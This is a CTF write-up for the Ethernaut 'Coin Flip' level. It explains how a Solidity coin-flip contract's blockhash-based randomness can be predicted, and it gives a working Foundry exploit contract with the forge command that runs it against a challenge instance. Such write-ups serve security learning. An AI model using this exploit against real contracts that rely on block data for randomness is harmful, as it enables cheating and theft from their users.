---
title: 'Coin Flip - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level3.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-17
lastmod: 2025-09-17
---

## Challenge Overview

This level presents a coin flipping game where you need to correctly guess the outcome of a coin flip 10 times in a row to win.

The challenge appears to rely on randomness from blockchain data, but this randomness is actually **predictable** because it uses publicly available block information. By calculating the same value off-chain, we can guarantee correct guesses every time.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

---

## Exploit Explanation

The vulnerability lies in the use of deterministic blockchain data for randomness:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1;
```

* `blockhash(block.number - 1)` is **publicly available information** that anyone can access
* The calculation `blockValue / FACTOR` will always produce the same result for the same block
* Since we can perform this identical calculation ourselves, we can **predict the outcome** before calling the `flip()` function

The exploit involves:
1. Creating an attacker contract that calculates the flip outcome using the same logic
2. Calling the vulnerable contract's `flip()` function with the pre-calculated result
3. Repeating this process 10 times to achieve the required winning streak

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/CoinFlip.sol";

contract Exploit {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlipInstance;

    constructor(CoinFlip _coinFlipInstance) {
        coinFlipInstance = _coinFlipInstance;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;
        coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinFlipInstance = CoinFlip(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Deploy exploit contract
        Exploit exploit = new Exploit(coinFlipInstance);
        
        // Execute the attack
        exploit.attack();
        
        // Verify results
        console.log("Number of wins:", coinFlipInstance.consecutiveWins());
        
        vm.stopBroadcast();
    }
}
```

Note: You'll need to run this script **10 times** (once for each required win), waiting for a new block between each execution since the contract prevents multiple calls in the same block.

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/CoinFlipSolution.s.sol --rpc-url $SEPOLIA_URL --tc CoinFlipSolution --broadcast
```

Repeat this command 10 times, ensuring each transaction is mined in a different block to bypass the `lastHash` check and build your winning streak.